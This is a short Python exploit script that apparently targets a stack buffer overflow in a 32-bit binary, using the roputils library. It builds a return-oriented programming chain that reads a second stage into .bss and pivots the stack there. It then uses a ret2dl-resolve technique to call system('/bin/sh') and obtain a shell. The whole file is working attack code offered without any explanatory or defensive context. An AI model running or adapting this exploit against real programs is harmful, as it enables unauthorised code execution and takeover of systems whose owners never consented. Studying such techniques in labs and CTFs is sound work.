from roputils import *

fpath = sys.argv[1]
offset = int(sys.argv[2])

rop = ROP(fpath)
addr_stage = rop.section('.bss') + 0x400

buf = rop.retfill(offset)
buf += rop.call('read', 0, addr_stage, 100)
buf += rop.pivot(addr_stage)

p = Proc(rop.fpath)
p.write(p32(len(buf)) + buf)
print "[+] read: %r" % p.read(len(buf))

buf = rop.dl_resolve(addr_stage, 'system', addr_stage+80)
buf += rop.fill(80, buf)
buf += rop.string('/bin/sh')
buf += rop.fill(100, buf)

p.write(buf)
p.wait(0)
